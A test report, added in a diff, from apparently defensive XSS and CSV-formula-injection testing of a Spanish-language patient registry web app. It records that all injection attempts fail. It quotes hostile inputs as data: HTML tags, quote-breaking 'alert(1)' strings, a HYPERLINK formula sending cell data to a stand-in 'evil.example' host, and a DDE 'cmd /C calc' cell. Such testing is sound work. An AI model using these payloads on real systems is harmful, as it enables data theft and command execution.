@@ -1,0 +1,268 @@
+A2 — sumideros de HTML en Chromium · servidor http://127.0.0.1:3281
+Chromium 153.0.8010.12
+CSP del servidor: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https://mt0.google.com https://mt1.google.com https://mt2.google.com https://mt3.google.com https://*.basemaps.cartocdn.com https://*.tile.openstreetmap.fr https://server.arcgisonline.com; connect-src 'self'; font-src 'self' data:; worker-src 'self'; manifest-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'
+
+=== PARTE 1 — alcance real: un paciente por campo, cargado por /api/padron/importar-lote (ADMIN) ===
+
+Campo | servidor | lo que quedó guardado
+direccion                      | ACEPTA      | GUARDADO TAL CUAL
+historia_clinica               | RECHAZA 400 | -
+telefono                       | RECHAZA 400 | -
+sector_sanitario               | RECHAZA 400 | -
+sector                         | ACEPTA      | GUARDADO TAL CUAL
+financiador                    | ACEPTA      | GUARDADO TAL CUAL
+seguro_salud                   | ACEPTA      | GUARDADO TAL CUAL
+seguro                         | ACEPTA      | GUARDADO TAL CUAL
+tipo_documento                 | ACEPTA      | GUARDADO TAL CUAL
+establecimiento_adscripcion    | ACEPTA      | GUARDADO TAL CUAL
+establecimiento_control        | ACEPTA      | GUARDADO TAL CUAL
+puerta_entrada                 | ACEPTA      | TRANSFORMADO "NUEVO HOSPITAL DE APOYO HUARMEY"
+estado_control                 | ACEPTA      | TRANSFORMADO "No Controlado"
+diagnostico_nutricional        | ACEPTA      | GUARDADO TAL CUAL
+riesgo_cv                      | ACEPTA      | GUARDADO TAL CUAL
+dano_organo_blanco             | ACEPTA      | GUARDADO TAL CUAL
+otras_patologias               | ACEPTA      | GUARDADO TAL CUAL
+tratamiento_hta                | ACEPTA      | GUARDADO TAL CUAL
+tratamiento_dm                 | ACEPTA      | GUARDADO TAL CUAL
+estado_empadronamiento         | ACEPTA      | GUARDADO TAL CUAL
+observacion                    | ACEPTA      | GUARDADO TAL CUAL
+observaciones                  | ACEPTA      | GUARDADO TAL CUAL
+nota_duplicado_padron          | RECHAZA 400 | -
+hba1c_texto                    | ACEPTA      | GUARDADO TAL CUAL
+peso                           | ACEPTA      | GUARDADO TAL CUAL
+talla                          | ACEPTA      | GUARDADO TAL CUAL
+imc                            | ACEPTA      | GUARDADO TAL CUAL
+pab                            | ACEPTA      | GUARDADO TAL CUAL
+creatinina                     | ACEPTA      | GUARDADO TAL CUAL
+microalbumina                  | ACEPTA      | GUARDADO TAL CUAL
+depuracion_creatinina          | ACEPTA      | GUARDADO TAL CUAL
+colesterol_total               | ACEPTA      | GUARDADO TAL CUAL
+colesterol_ldl                 | ACEPTA      | GUARDADO TAL CUAL
+colesterol_hdl                 | ACEPTA      | GUARDADO TAL CUAL
+trigliceridos                  | ACEPTA      | GUARDADO TAL CUAL
+edad                           | ACEPTA      | DESCARTADO
+frecuencia_hearts              | ACEPTA      | DESCARTADO
+fila_excel                     | ACEPTA      | DESCARTADO
+dias_restantes                 | ACEPTA      | TRANSFORMADO 25
+dias_vencido                   | ACEPTA      | DESCARTADO
+fecha_examenes                 | RECHAZA 400 | -
+fecha_estado                   | RECHAZA 400 | -
+pas_ene                        | RECHAZA 400 | -
+pad_ene                        | RECHAZA 400 | -
+pas_oct                        | RECHAZA 400 | -
+pad_oct                        | RECHAZA 400 | -
+glucosa                        | RECHAZA 400 | -
+hba1c                          | RECHAZA 400 | -
+pa_sistolica                   | RECHAZA 400 | -
+pa_diastolica                  | RECHAZA 400 | -
+estatina                       | ACEPTA      | GUARDADO TAL CUAL
+aspirina_aas                   | ACEPTA      | GUARDADO TAL CUAL
+meses_medicacion               | ACEPTA      | GUARDADO TAL CUAL
+estado_paciente                | ACEPTA      | GUARDADO TAL CUAL
+semaforo                       | ACEPTA      | GUARDADO TAL CUAL
+sexo                           | RECHAZA 400 | -
+apellidos_nombres              | RECHAZA 400 | -
+fecha_nacimiento               | RECHAZA 400 | -
+consentimiento                 | ACEPTA      | DESCARTADO
+actualizado_por                | ACEPTA      | GUARDADO TAL CUAL
+dx_confirmado                  | ACEPTA      | GUARDADO TAL CUAL
+enfermedad_cardiovascular      | ACEPTA      | GUARDADO TAL CUAL
+conditions.cie10_cod           | RECHAZA 400 | -
+conditions.diagnostico         | RECHAZA 400 | -
+diagnosticos.0                 | RECHAZA 400 | -
+observations.estado_control    | RECHAZA 400 | -
+appointments.estado            | RECHAZA 400 | -
+
+Pacientes hostiles cargados en la sesión del ADMIN: 45
+Marcadores en el mapa: 65
+
+Campo (aceptado por el servidor) | lista | tooltip | popup | ficha | tablero | registro   [ELEMENTO = se inyectó un elemento; literal = se ve el texto; - = no se muestra]
+direccion                      | literal  | -        | literal  | literal  | -        | literal 
+sector                         | -        | -        | -        | -        | -        | literal 
+financiador                    | -        | literal  | literal  | literal  | -        | literal 
+seguro_salud                   | -        | literal  | literal  | literal  | -        | literal 
+seguro                         | -        | literal  | literal  | literal  | -        | literal 
+tipo_documento                 | -        | -        | -        | -        | -        | literal 
+establecimiento_adscripcion    | -        | -        | -        | -        | -        | literal 
+establecimiento_control        | -        | -        | -        | -        | -        | literal 
+puerta_entrada                 | -        | -        | -        | -        | -        | -       
+estado_control                 | -        | -        | -        | -        | -        | -       
+diagnostico_nutricional        | -        | -        | -        | literal  | -        | -       
+riesgo_cv                      | -        | -        | -        | literal  | -        | -       
+dano_organo_blanco             | -        | -        | -        | literal  | -        | -       
+otras_patologias               | -        | -        | -        | literal  | -        | -       
+tratamiento_hta                | -        | -        | -        | literal  | -        | literal 
+tratamiento_dm                 | -        | -        | -        | literal  | -        | literal 
+estado_empadronamiento         | -        | -        | -        | literal  | -        | -       
+observacion                    | -        | -        | -        | -        | -        | -       
+observaciones                  | -        | -        | -        | -        | -        | -       
+hba1c_texto                    | -        | literal  | literal  | literal  | -        | -       
+peso                           | -        | -        | -        | literal  | -        | -       
+talla                          | -        | -        | -        | literal  | -        | -       
+imc                            | -        | -        | -        | literal  | -        | -       
+pab                            | -        | -        | -        | literal  | -        | -       
+creatinina                     | -        | -        | -        | literal  | -        | -       
+microalbumina                  | -        | -        | -        | literal  | -        | -       
+depuracion_creatinina          | -        | -        | -        | literal  | -        | -       
+colesterol_total               | -        | -        | -        | literal  | -        | -       
+colesterol_ldl                 | -        | -        | -        | literal  | -        | -       
+colesterol_hdl                 | -        | -        | -        | literal  | -        | -       
+trigliceridos                  | -        | -        | -        | literal  | -        | -       
+edad                           | -        | -        | -        | -        | -        | -       
+frecuencia_hearts              | -        | -        | -        | -        | -        | -       
+fila_excel                     | -        | -        | -        | -        | -        | -       
+dias_restantes                 | -        | -        | -        | -        | -        | -       
+dias_vencido                   | -        | -        | -        | -        | -        | -       
+estatina                       | -        | -        | -        | -        | -        | literal 
+aspirina_aas                   | -        | -        | -        | -        | -        | literal 
+meses_medicacion               | -        | -        | -        | -        | -        | literal 
+estado_paciente                | -        | -        | -        | -        | -        | literal 
+semaforo                       | -        | -        | -        | -        | -        | -       
+consentimiento                 | -        | -        | -        | -        | -        | -       
+actualizado_por                | -        | -        | -        | -        | -        | -       
+dx_confirmado                  | -        | -        | -        | -        | -        | literal 
+enfermedad_cardiovascular      | -        | -        | -        | -        | -        | literal 
+
+PARTE 1 — campos que llegan a ser ELEMENTO inyectado por la ruta real: ninguno
+Violaciones de CSP en la sesión: []
+
+=== PARTE 2 — defensa en profundidad: todos los campos hostiles puestos EN MEMORIA (sin pasar por el servidor) ===
+
+Campo | lista | tooltip | popup | ficha | tablero | registro
+direccion                      | literal  | -        | literal  | literal  | -        | literal 
+historia_clinica               | -        | literal  | literal  | literal  | -        | literal 
+telefono                       | -        | -        | -        | -        | -        | -       
+sector_sanitario               | -        | literal  | literal  | literal  | -        | -       
+sector                         | -        | -        | -        | -        | -        | literal 
+financiador                    | -        | literal  | literal  | literal  | -        | -       
+seguro_salud                   | -        | -        | -        | -        | -        | literal 
+seguro                         | -        | -        | -        | -        | -        | -       
+tipo_documento                 | -        | -        | -        | -        | -        | literal 
+establecimiento_adscripcion    | -        | -        | -        | -        | -        | literal 
+establecimiento_control        | -        | -        | -        | -        | -        | literal 
+puerta_entrada                 | literal  | literal  | literal  | literal  | literal  | -       
+estado_control                 | literal  | -        | literal  | literal  | -        | -       
+diagnostico_nutricional        | -        | -        | -        | literal  | -        | -       
+riesgo_cv                      | -        | -        | -        | literal  | -        | -       
+dano_organo_blanco             | -        | -        | -        | literal  | -        | -       
+otras_patologias               | -        | -        | -        | literal  | -        | -       
+tratamiento_hta                | -        | -        | -        | literal  | -        | literal 
+tratamiento_dm                 | -        | -        | -        | literal  | -        | literal 
+estado_empadronamiento         | -        | -        | -        | literal  | -        | -       
+observacion                    | -        | -        | -        | -        | -        | -       
+observaciones                  | -        | -        | -        | -        | -        | -       
+nota_duplicado_padron          | -        | -        | -        | literal  | -        | -       
+hba1c_texto                    | -        | literal  | literal  | literal  | -        | -       
+peso                           | -        | -        | -        | literal  | -        | -       
+talla                          | -        | -        | -        | literal  | -        | -       
+imc                            | -        | -        | -        | literal  | -        | -       
+pab                            | -        | -        | -        | literal  | -        | -       
+creatinina                     | -        | -        | -        | literal  | -        | -       
+microalbumina                  | -        | -        | -        | literal  | -        | -       
+depuracion_creatinina          | -        | -        | -        | literal  | -        | -       
+colesterol_total               | -        | -        | -        | literal  | -        | -       
+colesterol_ldl                 | -        | -        | -        | literal  | -        | -       
+colesterol_hdl                 | -        | -        | -        | literal  | -        | -       
+trigliceridos                  | -        | -        | -        | literal  | -        | -       
+edad                           | literal  | -        | literal  | literal  | -        | -       
+frecuencia_hearts              | -        | -        | -        | -        | -        | -       
+fila_excel                     | -        | -        | -        | literal  | -        | -       
+fecha_examenes                 | -        | -        | -        | literal  | -        | -       
+fecha_estado                   | -        | -        | -        | -        | -        | -       
+pas_ene                        | -        | -        | -        | -        | -        | -       
+pad_ene                        | -        | -        | -        | -        | -        | -       
+pas_oct                        | -        | -        | -        | -        | -        | -       
+pad_oct                        | -        | -        | -        | -        | -        | -       
+glucosa                        | -        | literal  | literal  | literal  | -        | literal 
+hba1c                          | -        | -        | -        | -        | -        | literal 
+pa_sistolica                   | -        | -        | -        | -        | -        | -       
+pa_diastolica                  | -        | -        | -        | -        | -        | -       
+estatina                       | -        | -        | -        | -        | -        | literal 
+aspirina_aas                   | -        | -        | -        | -        | -        | literal 
+meses_medicacion               | -        | -        | -        | -        | -        | literal 
+estado_paciente                | -        | -        | -        | -        | -        | literal 
+sexo                           | -        | -        | -        | literal  | -        | -       
+apellidos_nombres              | literal  | literal  | literal  | literal  | -        | literal 
+fecha_nacimiento               | -        | -        | -        | literal  | -        | -       
+consentimiento                 | -        | -        | -        | -        | -        | -       
+actualizado_por                | -        | -        | -        | -        | -        | -       
+dx_confirmado                  | -        | -        | -        | -        | -        | literal 
+enfermedad_cardiovascular      | -        | -        | -        | -        | -        | literal 
+conditions.cie10_cod           | -        | -        | -        | literal  | -        | -       
+conditions.diagnostico         | -        | -        | -        | literal  | -        | -       
+diagnosticos.0                 | literal  | literal  | literal  | -        | -        | -       
+observations.estado_control    | -        | -        | -        | -        | -        | -       
+appointments.estado            | -        | -        | -        | -        | -        | -       
+
+PARTE 2 — campos que producen ELEMENTO inyectado aunque el servidor los dejara pasar: ninguno
+Campos que se muestran escapados (texto literal): 48
+Campos que ninguna pantalla muestra: 16 (telefono, seguro, observacion, observaciones, frecuencia_hearts, fecha_estado, pas_ene, pad_ene, pas_oct, pad_oct, pa_sistolica, pa_diastolica, consentimiento, actualizado_por, observations.estado_control, appointments.estado)
+
+id, documento, nombre y puerta de entrada hostiles (lista, ficha, popup, tooltip; 1 paciente): elementos inyectados = 0; botones con data-arg hostil = 9 (acciones: openPatientDetail, centrarPaciente, enviarWhatsApp, fichaUbicar, fichaRegistrar, fichaPreCita); atributos de esos botones: ["class+data-accion+data-arg+role+tabindex+aria-label","class+data-accion+data-arg+role+tabindex","class+data-accion+data-arg+title+aria-label"] (el valor entra como texto del atributo, sin atributos nuevos)
+Fallecido y HOSIX (ficha): elementos inyectados = []; escapados (texto) = ["pac-mem-2:xss_fecha_estado","pac-mem-2:xss_observacion_fallecido","pac-mem-3:xss_pe_hosix","pac-mem-3:xss_pe_hosix","pac-mem-3:xss_observacion_hosix","pac-mem-3:xss_pe_hosix"]
+
+=== PARTE 3a — qué se puede hacer con un elemento inyectado (nota_duplicado_padron, lo único que llega por la API) ===
+COORDINADOR (red Pacífico Sur) carga por API un paciente con nota_duplicado_padron hostil: HTTP 400
+Elementos presentes en la ficha de la víctima (ADMIN): {"img":false,"btn":false,"btn2":false,"a":false,"form":false,"ifr":false,"style":false,"base":false,"link":false,"svg":false,"div":false,"pwn":"no ejecutado","csp":[],"baseUri":"http://127.0.0.1:3281/","outline":"none"}
+Enlace inyectado visible y clicable: null
+Elemento que recibe un clic físico en el centro de la pantalla: #CANVAS (si fuera #xss_n_div, el div inyectado a pantalla completa tapa la aplicación: suplantación visual)
+(el botón inyectado no existe en la ficha de la víctima: no hay nada que pulsar)
+Clic en el botón inyectado (data-accion="clicEn" data-arg="btn-logout"): sesión cerrada = false (antes: pantalla de acceso visible = false)
+(el botón inyectado «confirmarPreCita» no existe en la ficha de la víctima: no hay nada que pulsar)
+Botón inyectado «Cerrar» con data-accion="confirmarPreCita": pre-citas del paciente antes = 0, después del clic de la víctima (COORDINADORA) = 0 (se escribió en el servidor con su sesión, sin ejecutar ningún script)
+<meta http-equiv="refresh"> inyectado: navegación forzada fuera de la aplicación = no
+Resumen de la CSP: script en línea y manejadores bloqueados = true; violaciones registradas: 0
+
+=== PARTE 3a-bis — la misma carga puesta EN MEMORIA (defensa del cliente, aunque el servidor la dejara pasar) y botones inyectados a mano ===
+Carga fuerte en nota_duplicado_padron, en memoria: elementos presentes en la ficha = {"img":false,"btn":false,"btn2":false,"a":false,"form":false,"ifr":false,"style":false,"base":false,"link":false,"svg":false,"div":false,"meta":false,"pwn":"no ejecutado","textoVisible":true,"baseUri":"http://127.0.0.1:3281/"}
+Botones inyectados a mano (clicEn «btn-logout», quitarElemento «login-overlay» y «map», cerrarModal «modal-registro-clinico»): {"sesionAbierta":true,"loginVisible":false,"loginEnDom":true,"mapaEnDom":true,"registroSigueAbierto":true,"fichaCerradaConIdDeLaLista":true}
+
+=== PARTE 3b — acciones.js: ¿se puede invocar algo fuera de la lista cerrada? ===
+33 acciones de clic y 6 de cambio en la lista. Nombres ajenos probados (19, en clic y en cambio): llamadas a métodos = 0; errores = 0
+Argumentos con comillas/backtick/${…} dentro de la lista llegan como texto: ["switchView:\"'`);alert(1);//<u id=x>","selectRis:156'); window.__sentinel=1;//","enviarWhatsApp:${window.__sentinel=2}"]; variable centinela (código ejecutado) = 0
+data-accion usadas en index.html y plantillas: 33; fuera de la lista: ninguna; en la lista sin uso: ninguna
+data-cambio usadas: 6; fuera de la lista: ninguna
+
+=== PARTE 3c — pin de búsqueda del mapa (mapManager.js:1096, autoinyección) ===
+Texto escrito por el propio usuario en el buscador → {"elem":false,"img":false,"pwn":"no ejecutado"}
+
+=== PARTE 3d — usuarios con nombre hostil (ADMIN los crea), eventos hostiles, comillas y backticks ===
+Lista de usuarios (ADMIN): elementos inyectados = 0; el nombre se ve literal = <img src=x id=xss_user_nombre>
+Sesión del usuario con nombre hostil: elementos inyectados = 0; chip = "<img src=x id=xss_user_nombre>\"'`>"; aviso = "Bienvenido(a), <img src=x id=xss_user_nombre>\"'`>"
+Eventos con carga hostil por la API (POST /patients/:id/eventos): estado: RECHAZA 400 · detalle: ACEPTA · tipo: RECHAZA 400 · establecimiento_id: RECHAZA 400 · fecha: RECHAZA 400
+Pre-cita con comentario hostil por la API (POST /appointments/pre-cita): ACEPTA (el comentario sale en la ficha como «detalle» del evento de tipo cita)
+Línea de tiempo de la ficha: elementos inyectados = 0; textos hostiles visibles como literal = ["xss_ev_precita","xss_ev_detalle"]; eventos pintados = 4
+Alta por API de un paciente con comillas, backtick y ampersands en nombre y dirección: HTTP 200
+Nombre con comillas dobles, simples, backtick, &amp;, &#60; y ${…} en lista (texto, title, aria-label): {"hallado":true,"textoIgual":true,"titleIgual":true,"ariaIgual":true,"direccionIgual":true,"titleDireccionIgual":true,"atributosCabecera":"class,data-accion,data-arg,role,tabindex,aria-label","atributosNombre":"class,title"}
+
+=== PARTE 3g — CSV de HOSIX cargado desde la interfaz (queda solo en memoria; no pasa por el servidor, así que no hay defensa del servidor) ===
+Pacientes del CSV en memoria: 1 (el CSV nunca se envía al servidor); pantallas recorridas: lista, tooltip, popup, ficha, tablero y registro clínico
+Campos hostiles del CSV (historia clínica, nombre, dirección, CIE-10, estado de control, distrito, documento): elementos inyectados = 0
+Comprobación de que la prueba no es vacía: la lista muestra el nombre hostil como texto = true; la ficha lo muestra como texto = true; la ficha muestra el CIE-10 hostil como texto = false
+
+=== PARTE 3e — Excel hostil por la cuadrícula del padrón (importación real desde la interfaz) ===
+[fila con direccion, tratamiento, observaciones, actualizado_por hostiles] cuadrícula: elementos inyectados = 0; filas = 1; píldoras de error = 0; carga hostil visible como texto = true; botón «Cargar» habilitado = true; campos que el validador de la cuadrícula observa: ninguno
+Tras entrar y salir de la edición de una celda (Esc en el campo; restituye el HTML con innerHTML = oldHtml): elementos inyectados = 0
+Servidor tras cargar desde la interfaz: GUARDÓ al paciente (direccion = "\"'><u id=\"xss_xl_direccion\">ZZ</u>")
+Valores del Excel hostil ya guardados, vistos en lista, ficha y registro clínico: elementos inyectados = 0; se ven como texto en la ficha = ["xss_xl_direccion","xss_xl_tratamiento_hta","xss_xl_tratamiento_dm"]
+[fila con nombre, historia clínica, teléfono y CIE-10 con < >] cuadrícula: elementos inyectados = 0; filas = 1; píldoras de error = 0; carga hostil visible como texto = true; botón «Cargar» habilitado = true; campos que el validador de la cuadrícula observa: ninguno
+Tras el rechazo del lote: el paciente quedó en la memoria de la aplicación = false; la cuadrícula sigue abierta = true con 1 fila(s) por corregir; mensaje en la cuadrícula: «No se guardó ningún paciente: Fila 1: apellidos_nombres contiene caracteres no permitidos (< o >). Las filas siguen en la cuadrícula para corregirlas.»
+El servidor rechaza el lote (no guardó = true); aviso en pantalla: «No se guardó ningún paciente: Fila 1: apellidos_nombres contiene caracteres no permitidos (< o >). Las filas siguen en la cuadrícula para corregirlas.»; elementos inyectados en la página = 0
+
+=== PARTE 3f — CSV de pre-citas y Excel exportado: inyección de fórmulas ===
+Paciente con nombre, dirección, HC y teléfono que empiezan con = @ + - TAB: servidor ACEPTA
+Celdas del CSV de pre-citas (DNI, HC, PACIENTE, TELEFONO, DIRECCION): ["96800004","'+1+1","'=HYPERLINK(\"\"http://evil.example/?x=\"\"&A1,\"\"clic\"\")","'-2+3","'@SUM(1+1)*cmd|' /C calc'!A0"]
+Celdas del CSV que todavía empiezan con = + - @ TAB CR: 0
+Archivo descargado «PreCitas_HOSIX_Huarmey_2026-11-05.csv»: 1 fila(s) de datos; alguna celda empieza con = + - @ TAB CR = false
+Excel exportado «Padron_Cronicos_Huarmey_2026-11-05.xlsx»: 1632 fórmulas <f> en la hoja Padrón, todas de la plantilla (ROW(), IF(), DATEDIF()…); fórmulas que contienen la carga hostil = 0
+Celda con el nombre hostil en el XML: <c r="F75" t="str"><v>=HYPERLINK("http://evil.example/?x="&amp;A1,"clic&quo…  (tipo texto, sin <f>)
+LibreOffice (abre el .xlsx exportado y lo convierte a CSV): la celda sigue siendo texto literal «=HYPERLINK(…)» = true; fue evaluada como fórmula = false
+
+=== RESUMEN A2 ===
+Ruta real (API → servidor → pantalla), 46 campos aceptados de 67 probados: elementos inyectados = 0 → ninguno
+En memoria (si el servidor dejara pasar el dato): ningún campo llega como elemento
+Autoinyección (el usuario se escribe a sí mismo): pin de búsqueda → elemento = false, script ejecutado = false
+Sin elemento inyectado en: lista, tooltip, popup, ficha, tablero, registro clínico, línea de tiempo, usuarios, chip, cuadrícula del padrón, CSV de HOSIX y mensajes del servidor (resto de los campos y sumideros).
+
+Errores de página (excepciones no capturadas): []
+Violaciones de CSP en la sesión principal: []
